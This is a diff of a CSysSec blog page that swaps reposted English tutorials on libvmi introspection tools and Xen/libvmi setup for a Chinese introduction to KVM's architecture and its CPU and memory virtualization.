@@ -106,7 +106,7 @@
         
           <section id="main">
   
-    <article id="post-libvmiintrospection"  class="article article-type-post" itemscope itemprop="blogPost" >
+    <article id="post-kvmsource-intro"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
     
@@ -114,7 +114,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170102/libvmiintrospection/">Write Introspection Tools Using Libvmi</a>
+      <a class="article-title" href="/20170104/kvmsource-intro/">KVM源码分析之基本工作原理</a>
     </h1>
   
 
@@ -122,157 +122,64 @@
     
     <div class="article-meta">
       
-	Posted on <a href="/20170102/libvmiintrospection/" class="article-date">
-	  <time datetime="2017-01-02T03:01:20.000Z" itemprop="datePublished">一月 2, 2017</time>
+	Posted on <a href="/20170104/kvmsource-intro/" class="article-date">
+	  <time datetime="2017-01-04T05:46:19.000Z" itemprop="datePublished">一月 4, 2017</time>
 	</a>
 
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>作者：<a href="http://ytliu.info/blog/2013/08/14/write-introspection-tools-using-libvmi/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
+        <p>作者：<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
 <hr>
-<p><strong>CSysSec注</strong>： Libvmi是个虚拟机监控API，本文介绍如何利用Libvmi写自己的监控工具。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">Libvmi Setup</a>》</p>
-<hr>
-<p>Last week I’ve discussed about how to <a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">setup libvmi</a>, in this post I will show you how to write introspection tools using libvmi.</p>
-<p>The most typical example is <code>examples/process-list.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libvmi/libvmi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div></pre></td></tr></table></figure></p>
-<p>Firstly we need to include these header files, especially the <code>&lt;libvmi/libvmi.h&gt;</code>, it defines most of the variables and functions.</p>
-<p>Then we should initialize the vmi environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* initialize the libvmi library */</span></div><div class="line"><span class="keyword">if</span> (vmi_init(&amp;vmi, VMI_AUTO | VMI_INIT_COMPLETE, name) == VMI_FAILURE) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to init LibVMI library.\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>It will initialize the vmi (<code>vmi_instance_t</code>) struct with some platform information.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* init the offset values */</span></div><div class="line"><span class="keyword">if</span> (VMI_OS_LINUX == vmi_get_ostype(vmi)) &#123;</div><div class="line">    tasks_offset = vmi_get_offset(vmi, <span class="string">"linux_tasks"</span>);</div><div class="line">    name_offset = vmi_get_offset(vmi, <span class="string">"linux_name"</span>);</div><div class="line">    pid_offset = vmi_get_offset(vmi, <span class="string">"linux_pid"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>Then in this case, we should read some offset of tast_struct from the config file <code>/etc/libvmi.conf</code>. And if you want to add a config argument like <code>linux_files</code>, you can do as follows:</p>
-<p>Add an item in <code>libvmi/config/grammar.y</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">%token&lt;str&gt;  LINUX_FILES</div><div class="line">...</div><div class="line">assignment:</div><div class="line">  |</div><div class="line">...</div><div class="line">  linux_state_assignment</div><div class="line">  |</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>Then add an item in <code>libvmi/config/lexicon.l</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">linux_files  &#123; BeginToken(yytext); yylval.str = strndup(yytext, CONFIG_STR_LENGTH); <span class="keyword">return</span> LINUX_FILES;&#125;</div></pre></td></tr></table></figure></p>
-<p>Then add corresponding <code>strncmp</code> in <code>libvmi/os/linux/core.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">if</span> (stncmp(key, <span class="string">"linux_files"</span>, CONFIG_STR_LENGTH) == <span class="number">0</span>) &#123;</div><div class="line">  linux_instance-&gt;files_offset = *(<span class="keyword">int</span> *)value;</div><div class="line">  <span class="keyword">goto</span> _done;</div><div class="line">&#125;</div><div class="line">...</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(offset_name, <span class="string">"linux_files"</span>, max_length) == <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">return</span> linux_instance-&gt;files_offset;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>At last add the <code>files_offset</code> item to <code>struct linux_instance</code> in <code>libvmi/os/linux/linux.h</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> linux_instance &#123;</div><div class="line">  ...</div><div class="line">  <span class="keyword">uint64_t</span> files_offset;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="Then-compile-again-after-that-your-can-add-linux-files-to-your-config-file"><a href="#Then-compile-again-after-that-your-can-add-linux-files-to-your-config-file" class="headerlink" title="Then compile again, after that your can add linux_files to your config file."></a>Then compile again, after that your can add linux_files to your config file.</h3><p>Now, let’s continue to look at the vmi code:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* pause the vm for consistent memory access */</span></div><div class="line"><span class="keyword">if</span> (vmi_pause_vm(vmi) != VMI_SUCCESS) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pause VM\n"</span>);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">&#125; <span class="comment">// if</span></div></pre></td></tr></table></figure></p>
-<p>Before we do the vmi, we need to pause the vm for consistent memory access, then we can read memory from guest memory:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* get the head of the list */</span></div><div class="line"><span class="keyword">if</span> (VMI_OS_LINUX == vmi_get_ostype(vmi)) &#123;</div><div class="line">    current_process = vmi_translate_ksym2v(vmi, <span class="string">"init_task"</span>);</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">/* walk the task list */</span></div><div class="line">list_head = current_process + tasks_offset;</div><div class="line">current_list_entry = list_head;</div><div class="line"></div><div class="line">status = vmi_read_addr_va(vmi, current_list_entry, <span class="number">0</span>, &amp;next_list_entry);</div><div class="line"><span class="keyword">if</span> (status == VMI_FAILURE) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read next pointer at 0x%lx before entering loop\n"</span>,</div><div class="line">            current_list_entry);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>We firstly get the head of the task_struct list <code>current_process</code>, then use <code>vmi_read_addr_va</code> to read the memory in address <code>current_list_entry</code>, which is the address of <code>next_list_entry</code>.</p>
-<p>Here <code>vmi_read_addr_va</code> is similar with following <code>vmi_read_32_va</code>, <code>vmi_read_str_va</code> and so on. These lib functions take the virtual address (<code>vaddr</code>) as one of there parameters, they firstly walk the page table with cr3 and get physical address (<code>paddr</code>), then they use the libxenctrl to map a memory page of that paddr, which return back the virtual address (<code>memory</code>) seen by Dom0, with the <code>memory</code>, they can use <code>memcpy</code> to copy the corresponding size of memory to the <code>buf</code>.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span> &#123;</div><div class="line">    vmi_read_32_va(vmi, current_process + pid_offset, <span class="number">0</span>, &amp;pid);</div><div class="line">    procname = vmi_read_str_va(vmi, current_process + name_offset, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (procname) &#123;</div><div class="line">        <span class="built_in">free</span>(procname);</div><div class="line">        procname = <span class="literal">NULL</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    current_list_entry = next_list_entry;</div><div class="line">    current_process = current_list_entry - tasks_offset;</div><div class="line"></div><div class="line">    <span class="comment">/* follow the next pointer */</span></div><div class="line">    status = vmi_read_addr_va(vmi, current_list_entry, <span class="number">0</span>, &amp;next_list_entry);</div><div class="line">    <span class="keyword">if</span> (status == VMI_FAILURE) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to read next pointer in loop at %lx\n"</span>, current_list_entry);</div><div class="line">        <span class="keyword">goto</span> error_exit;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">while</span> (next_list_entry != list_head);</div></pre></td></tr></table></figure></p>
-<p>This is the main loop of process vmi: it uses <code>vmi_read_32_va</code> to read pid (<code>pid_offset</code>) of each process, use <code>vmi_read_str_va</code> to read name (<code>name_offset</code>) of each process, and at last use <code>vmi_read_addr_va</code> to read the next entry of tast_struct in the list.</p>
-<p>Finally we should never forget to resume the guest vm and destroy the vmi environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* resume the vm */</span></div><div class="line">vmi_resume_vm(vmi);</div><div class="line"></div><div class="line"><span class="comment">/* cleanup any memory associated with the LibVMI instance */</span></div><div class="line">vmi_destroy(vmi);</div></pre></td></tr></table></figure></p>
-<p>We can compile and run the vmi tool in the root directory of libvmi:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ sudo ./examples/process-<span class="built_in">list</span> vm_name</div></pre></td></tr></table></figure></p>
-<p>If you want to write your own vmi tools, you can imitate the <code>process-list</code> to write a new one (e.g. my_vmi_tool.c). After that, you need to modify the <code>examples/Makefile.am</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">bin_PROGRAMS = ... my_vmi_tool</div><div class="line">...</div><div class="line">my_vmi_tool_SOURCES = my_vmi_tool.c</div></pre></td></tr></table></figure></p>
-<p>Actually after we run <code>make</code> in the root directory of libvmi, the <code>Makefile</code> in <code>examples/</code>directory will generate a new executable file called <code>my_vmi_tool</code>, which is a script file to invoke the actual code in your <code>my_vmi_tool.c</code>.</p>
-<hr>
-<p>Last thing you should know is: currently vmi tool are all user mode application code. It does not support to write vmi tool as a kernel module. The environment you vmi code run is just the user space on the host OS.</p>
-<p>Whenever you have any problem with libvmi, you can create a post in their <a href="https://groups.google.com/forum/#!forum/vmitools" target="_blank" rel="external">googlegroup</a>. The guys there are really very friendly, I’ve post 2 topics there and both receive very good feedbacks.</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">Libvmi Setup</a>》</p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控<span class="article-category-count">6</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-libvmisetup"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170102/libvmisetup/">Libvmi setup</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170102/libvmisetup/" class="article-date">
-	  <time datetime="2017-01-02T02:54:50.000Z" itemprop="datePublished">一月 2, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://ytliu.info/blog/2013/08/04/libvmi-setup/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
-<hr>
-<p><strong>CSysSec注</strong>： 继<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">上一篇</a>文章介绍Libvmi后，这篇主要介绍如何搭建Libvmi。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">Libvmi Setup</a>》</p>
+<p><strong>CSysSec注</strong>： 本KVM源码分析系列文章来自系Intel中国Linux内核与虚拟化开发工程师Oen Han的<a href="http://www.oenhan.com/kvm-src-1" target="_blank" rel="external">博客</a>,Oen Han 在虚拟化领域有丰富的开发经验，其写的KVM源码分析系列是本人目前见过最好最详细的，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-intro/" target="_blank" rel="external">KVM源码分析之基本工作原理</a>》</p>
 <hr>
 <blockquote>
 <ul>
-<li>0X01 Xen install</li>
-<li>0X02 Domain 0 install</li>
-<li>0X03 Domain U setup</li>
-<li>0X04 libvmi setup</li>
+<li>0X01 KVM模型结构</li>
+<li>0X02 KVM工作原理</li>
+<li>0X03 CPU虚拟化</li>
+<li>0X04 Memory虚拟化</li>
 </ul>
 </blockquote>
+<p>13年的时候准备挖“KVM源代码分析”的坑，陆陆续续2年过去了，坑也没有填上，当时是因为对KVM了解的肤浅，真正的理解必然要深入到代码级别，所谓“摈弃皮毛，看到血肉，看到真相”，当时计划写KVM基本工作原理、虚拟机的创建、VCPU调度原理、KVM内存管理、KVM设备管理等，实际发现代码过程还是很多，估计后续会针对于不同的点专门来写。</p>
+<p>需要假定读者有一定的内核基础，和虚拟化基础，原理性的东西估计会一笔带过，我在知乎上写过一些基础入门的书籍：1.首先有OS基础，随便操作系统大学课本；2.对Linux kernel有全面了解，关键模块有理解，推荐书籍：深入Linux内核架构（+1）或者深入理解LINUX内核；3.Hypervisor虚拟化，Intel的《系统虚拟化-原理与实现》，赶时间的建议先把第3步完成。</p>
+<p>进入正题：</p>
+<h3 id="0X01-KVM模型结构"><a href="#0X01-KVM模型结构" class="headerlink" title="0X01 KVM模型结构"></a>0X01 KVM模型结构</h3><p>为什么有OS虚拟化？随着CPU计算能力的提高，单独的OS已不能充分利用CPU的计算能力，1.很多应用的执行需要单独占用一个OS环境，如安全测试等；2.而IAAS云计算厂商也是以OS为范围销售计算能力。那么在所有虚拟化方案中，都是由hypervisor取代原生的OS去控制具体硬件资源，而同时hypervisor将资源分配具体的VM，VM中运行的是没有修改过的OS，如果让VM中的OS能正常运行，hypervisor的任务就是模拟具体的硬件资源，让OS不能识别出是真是假。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/kvmsource101.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/kvmsource101.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p>当然上面的模型是Xen示例，OS对应用而言是硬件资源管理中心，那么hypervisor就是具体VM的OS了，KVM是就利用了这一点，利用现有的kernel代码，构建了一个hypervisor，这个样子内存分配，进程调度等就无需重写代码，如此hypervisor就是所谓的host，VM中的OS就是guest。</p>
+<p>guest OS保证具体运行场景中的程序正常执行，而KVM的代码则部署在HOST上，Userspace对应的是QEMU，Kernel对应的是KVM Driver，KVM Driver负责模拟虚拟机的CPU运行，内存管理，设备管理等；QEMU则模拟虚拟机的IO设备接口以及用户态控制接口。QEMU通过KVM等fd进行IOCTL控制KVM驱动的运行过程。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/kvmsource102.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/kvmsource102.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p>如上图所示，guest自身有自己的用户模式和内核模式；guest是在host中是作为一个用户态进程存在的，这个进程就是qemu，qemu本身就是一个虚拟化程序，只是纯软件虚拟化效率很低，它被KVM进行改造后，作为KVM的前端存在，用来进行<a href="http://www.oenhan.com/cpu-load-balance" target="_blank" rel="external">创建进程</a>或者IO交互等；而KVM Driver则是Linux内核模式，它提供KVM fd给qemu调用，用来进行cpu虚拟化，内存虚拟化等。QEMU通KVM提供的fd接口，通过ioctl系统调用创建和运行虚拟机。KVM Driver使得整个Linux成为一个虚拟机监控器，负责接收qemu模拟效率很低的命令。</p>
+<h3 id="0X02-KVM工作原理"><a href="#0X02-KVM工作原理" class="headerlink" title="0X02 KVM工作原理"></a>0X02 KVM工作原理</h3><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/kvmsource103.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/kvmsource103.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>上图是一个执行过程图，首先启动一个虚拟化管理软件qemu，开始启动一个虚拟机，通过ioctl等系统调用向内核中申请指定的资源，搭建好虚拟环境，启动虚拟机内的OS，执行 VMLAUCH 指令，即进入了guest代码执行过程。如果 Guest OS 发生外部中断或者影子页表缺页之类的事件，暂停 Guest OS 的执行，退出QEMU即guest VM-exit，进行一些必要的处理，然后重新进入客户模式，执行guest代码；这个时候如果是io请求，则提交给用户态下的qemu处理，qemu处理后再次通过IOCTL反馈给KVM驱动。</p>
+<h3 id="0X03-CPU虚拟化"><a href="#0X03-CPU虚拟化" class="headerlink" title="0X03 CPU虚拟化"></a>0X03 CPU虚拟化</h3><p>X86体系结构CPU虚拟化技术的称为 Intel VT-x 技术，引入了VMX，提供了两种处理器的工作环境。 VMCS 结构实现两种环境之间的切换。 VM Entry 使虚拟机进去guest模式，VM Exit 使虚拟机退出guest模式。</p>
+<p>VMM调度guest执行时，qemu 通过 ioctl 系统调用进入内核模式，在 KVM Driver中获得当前物理 CPU的引用。之后将guest状态从VMCS中读出， 并装入物理CPU中。执行 VMLAUCH 指令使得物理处理器进入非根操作环境，运行guest OS代码。</p>
+<p>当 guest OS 执行一些特权指令或者外部事件时， 比如I/O访问，对控制寄存器的操作，MSR的读写等， 都会导致物理CPU发生 VMExit， 停止运行 Guest OS，将 Guest OS保存到VMCS中， Host 状态装入物理处理器中， 处理器进入根操作环境，KVM取得控制权，通过读取 VMCS 中 VM_EXIT_REASON 字段得到引起 VM Exit 的原因。 从而调用kvm_exit_handler 处理函数。 如果由于 I/O 获得信号到达，则退出到userspace模式的 Qemu 处理。处理完毕后，重新进入guest模式运行虚拟 CPU。</p>
+<h3 id="0X04-Mem虚拟化"><a href="#0X04-Mem虚拟化" class="headerlink" title="0X04 Mem虚拟化"></a>0X04 Mem虚拟化</h3><p>OS对于物理内存主要有两点认识：1.物理地址从0开始；2.内存地址是连续的。VMM接管了所有内存，但guest OS的对内存的使用就存在这两点冲突了，除此之外，一个guest对内存的操作很有可能影响到另外一个guest乃至host的运行。VMM的内存虚拟化就要解决这些问题。</p>
+<p>在OS代码中，应用也是占用所有的逻辑地址，同时不影响其他应用的关键点在于有线性地址这个中间层；解决方法则是添加了一个中间层：guest物理地址空间；guest看到是从0开始的guest物理地址空间（类比从0开始的线性地址），而且是连续的，虽然有些地址没有映射；同时guest物理地址映射到不同的host逻辑地址，如此保证了VM之间的安全性要求。</p>
+<p>这样MEM虚拟化就是GVA-&gt;GPA-&gt;HPA的寻址过程，传统软件方法有影子页表，硬件虚拟化提供了EPT支持。</p>
+<p>总体描述到此，后面代码里面见真相。</p>
+<p>《<a href="http://www.csyssec.org/20170104/kvmsource-create/" target="_blank" rel="external">KVM源码分析之虚拟机的创建与运行</a>》</p>
+<p>-结束-</p>
 <hr>
-<p>These days I was busy leanrning and trying one of the famous Virtual Machine Introspection (VMI) framework —— <a href="https://github.com/libvmi/libvmi" target="_blank" rel="external">libvmi</a>, it is a library which provides lots of serviceable APIs for programmer to develop introspection tools.</p>
-<p>As we know, one of the foremost problems of VMI is bridging semantics gap between protected and security VMs, libvmi provides APIs helping you to access the memory of a running virtual machine, more specifically, it provides primatives for accessing this memory using physical or virtual addresses and kernel symbols. I will discuss about that in the coming blog introducing libvmi usage.</p>
-<p>Now it’s the main topic of this blog: how to setup libvmi?</p>
-<p>Since libvmi currently support Xen and KVM, and Xen is my preference, following I will take xen as example platform.</p>
-<h3 id="0X01-Xen-install"><a href="#0X01-Xen-install" class="headerlink" title="0X01 Xen install"></a>0X01 Xen install</h3><p>Before setup libvmi, we need to install Xen first:</p>
-<p>One of the most straight forward way to install xen is using Debian’s aptitude:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install xen-linux-system<span class="number">-2.6</span> libc6-xen bridge-utils xen-tools</div></pre></td></tr></table></figure></p>
-<p>However, I cannot compile libvmi successfully in such environment, and after seeking in libvmi’s group solution, I need to compile xen from source code. Before that, I need to uninstall the previous installed xen environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sudo dpkg -l | grep xen</div><div class="line">purge them except Dom0 kernel:</div><div class="line">$ sudo dpkg -P libxenstore3<span class="number">.0</span></div><div class="line">…</div></pre></td></tr></table></figure></p>
-<p>Then download the latest 4.3.0 source tarball from <a href="https://www.xenproject.org" target="_blank" rel="external">xen.org</a> and do the usual:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make xen</div><div class="line">$ ./configure</div></pre></td></tr></table></figure></p>
-<p>Error: unable to find xgettext, please install xgettext<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install gettext</div></pre></td></tr></table></figure></p>
-<p>Error: unable to find as86, please install as86<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install bcc</div></pre></td></tr></table></figure></p>
-<p>Error: unable to find iasl, please install iasl<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install sail</div></pre></td></tr></table></figure></p>
-<p>Error: unable to find a uuid library<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install uuid-dev</div></pre></td></tr></table></figure></p>
-<p>Error: unable to find yawl, please install yajl<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libyajl-dev</div><div class="line">$ sudo aptitude install libpixman<span class="number">-1.</span>dev</div></pre></td></tr></table></figure></p>
-<p>After install all these pre-required library:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ make tools    </div><div class="line">$ make stubdom</div><div class="line">$ sudo make install-xen</div><div class="line">$ sudo make install-tools PYTHON_PREFIX_ARG=</div><div class="line">$ sudo make install-stubdom</div></pre></td></tr></table></figure></p>
-<p>Then Xen is successfully compiled.</p>
-<h3 id="0x02-Domain-0-install"><a href="#0x02-Domain-0-install" class="headerlink" title="0x02 Domain 0 install"></a>0x02 Domain 0 install</h3><p>After xen is installed, we need to compile the domain 0 ourselves.</p>
-<p>I download the latest linux kernel (here is 3.10.3) from <a href="https://www.kernel.org" target="_blank" rel="external">kernel.org</a>, then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make menuconfig</div></pre></td></tr></table></figure></p>
-<p>in the menuconfig, I choose the virtualization config options and some required device driver (specifically the SATA and SCSI ones), and then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ make -j4</div><div class="line">$ make modules</div><div class="line">$ make modules_install</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
-<p>Then domain 0 is also successfully compiled, and after we use<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ update-grub</div></pre></td></tr></table></figure></p>
-<p>the <code>grub.cfg</code> file in<code>/boot/grub/</code> will traverse the <code>/boot/</code> directory and fill all choiceable Xen and kernel image in the grub config during booting.</p>
-<p>Here I did not create the initrd of the kernel, because I’ve already compiled the essential driver in my kernel.</p>
-<h3 id="0x03-Domain-U-setup"><a href="#0x03-Domain-U-setup" class="headerlink" title="0x03 Domain U setup"></a>0x03 Domain U setup</h3><p>After the above done, we reboot, and enter into the Xen environment we just compiled, and are ready to setup our DomU.</p>
-<p>For our HVM DomU setup, we first need to provide a ISO image for DomU install —— <code>ubuntu.iso</code>, and<code>dd</code> for a 10G image:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dd <span class="keyword">if</span>=/dev/zero of=ubuntu.img bs=<span class="number">1000</span> count=<span class="number">0</span> seek=$[<span class="number">1000</span>*<span class="number">1000</span>*<span class="number">10</span>]</div></pre></td></tr></table></figure></p>
-<p>Then edit our HVM config file:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kernel = "hvmloader"</div><div class="line">builder='hvm'</div><div class="line">memory = 2048</div><div class="line">name = "ubuntu"</div><div class="line">vif = [ 'bridge=xenbr0' ]</div><div class="line">disk = [ 'file:diretory-to-domu/ubuntu.img,hda,w', 'file:diretory-to-domu/ubuntu.iso,hdc:cdrom,r' ]</div><div class="line">sdl=0</div><div class="line">opengl=1</div><div class="line">vnc=1</div><div class="line">vncpasswd=''</div><div class="line">stdvga=0</div><div class="line">serial='pty'</div><div class="line">tsc_mode=0</div></pre></td></tr></table></figure></p>
-<p>Then in the terminal, run following command:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo xm create ubuntu.hvm</div></pre></td></tr></table></figure></p>
